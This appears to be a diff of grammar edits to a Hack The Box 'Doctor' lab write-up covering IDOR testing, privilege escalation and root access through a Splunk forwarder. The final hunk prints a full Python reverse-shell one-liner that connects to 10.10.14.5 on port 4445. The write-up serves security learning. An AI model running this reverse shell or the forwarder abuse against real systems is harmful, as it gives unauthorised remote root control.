@@ -87,7 +87,7 @@ Then, I went through the process of creating a new post, which generated an addi
 
 ![Single post view screenshot](/img/htb/doctor/website-singlepost.png)
 
-I noticed that the ID for the post I created was `2`, so I tested for any IDOR (InDirect Object Reference) vulnerabilities. IDOR vulnerabilities enables an attacker to access data that doesn't implement proper access controls by guessing/identifying an ID/key associated with it and directly accessing it. For more information on IDOR, please see PortSwigger's [Web Security Academy IDOR section](https://portswigger.net/web-security/access-control/idor). I found a post with an ID of `1`, but it didn't seem to be very relevant to pwning this app:
+I noticed that the ID for the post I created was `2`, so I tested for any IDOR (InDirect Object Reference) vulnerabilities. IDOR vulnerabilities enable an attacker to access data that doesn't implement proper access controls by guessing/identifying an ID/key associated with some data and directly accessing it. For more information on IDOR, please see PortSwigger's [Web Security Academy IDOR section](https://portswigger.net/web-security/access-control/idor). I found a post with an ID of `1`, but it didn't seem to be very relevant to pwning this app:
 
 ![Admin post screenshot](/img/htb/doctor/website-adminpost.png)
 
@@ -129,7 +129,7 @@ And, voila! We have a shell as `web`:
 
 ## Privilege Escalation to User
 
-Unfortunately, the `user.txt` wasn't in `web`'s home folder, so I will need to escalate my permissions to another user. Looking at the list of users in `/etc/passwd`, I guess that I'd need to escalate to `shaun`, and confirmed that by checking his home folder and seeing `user.txt`:
+Unfortunately, the `user.txt` file wasn't in `web`'s home folder, so I needed to escalate my permissions to another user. Looking at the list of users in `/etc/passwd`, I guess that I'd need to escalate to `shaun`, and confirmed that by checking his home folder and seeing `user.txt`:
 
 ![shaun in /etc/passwd screenshot](/img/htb/doctor/shell-users.png)
 
@@ -163,7 +163,7 @@ With much hurrah, the creds worked! I could now rock and roll all over the Splun
 
 I started Googling for a way to exploit this service, and quickly discovered [this fantastic blog post](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) by [@eapolsniper](https://twitter.com/eapolsniper). Since we have authenticated access to the service, we can create a malicious app (like a plugin) for the forwarder that will provide RCE as root.
 
-I used [this script](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_local.py) (mentioned in that blog post) to create a malicious application that ran the below shell script, which would give me a reverse shell as `root`. Please note that the script was written for Python 2, and I had to adapt it for Python 3 as that's what was available on the box (change the `print ...` to `print(...)`).
+I used [this script](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_local.py) (mentioned in that blog post) to create a malicious application that ran the below shell script, which would give me a reverse shell as `root`. Please note that the script was written for Python 2, and I had to adapt it for Python 3 as that's what was available on the box (change the `print ...` statements to `print(...)`).
 
 ```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.5\",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'
